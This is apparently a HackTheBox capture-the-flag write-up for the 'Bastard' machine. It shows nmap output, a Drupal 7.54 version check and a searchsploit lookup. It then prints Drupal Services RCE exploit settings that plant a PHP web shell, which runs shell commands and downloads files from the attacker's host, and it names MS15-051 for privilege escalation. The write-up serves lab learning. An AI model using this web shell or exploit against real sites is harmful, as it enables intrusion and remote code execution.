# Bastard

## Information Gathering

Running nmap
```
root@kali:~/hackthebox/Bastard# cat nmap/bastard.nmap
# Nmap 7.70 scan initiated Tue Jul 16 11:22:20 2019 as: nmap -sC -sV -oA nmap/bastard 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up (0.071s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
We can see drupal in por 80.
http://10.10.10.9/CHANGELOG.txt shows exact version: Drupal 7.54, 2017-02-01
Let's search for available exploits:

```
root@kali:~/hackthebox/Bastard# searchsploit drupal 7.
...
Drupal 7.x Module Services - Remote Code Execution | exploits/php/webapps/41564.php
...
```

## Exploitation

Adjust and run the exploit:
```php
$url = 'http://10.10.10.9';                                                                                                                                  
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';
$phpCode = <<<'EOD'
<?php
        if (isset($_REQUEST['fupload'])) {
                file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.6:8090/" . $_REQUEST['fupload']));                               
        };
        if (isset($_REQUEST['fexec'])) {
                echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
        };
?>
EOD;
$file = [
    'filename' => 'shell2.php',
    'data' => $phpCode
];
```
Now we have a shell available at http://10.10.10.9/shell2.php

## PrivEsc
The machine is vulnerable to ms15-051, so we can upload and execute an exploit.
https://github.com/jivoi/pentest/blob/master/exploit_win/ms15-051
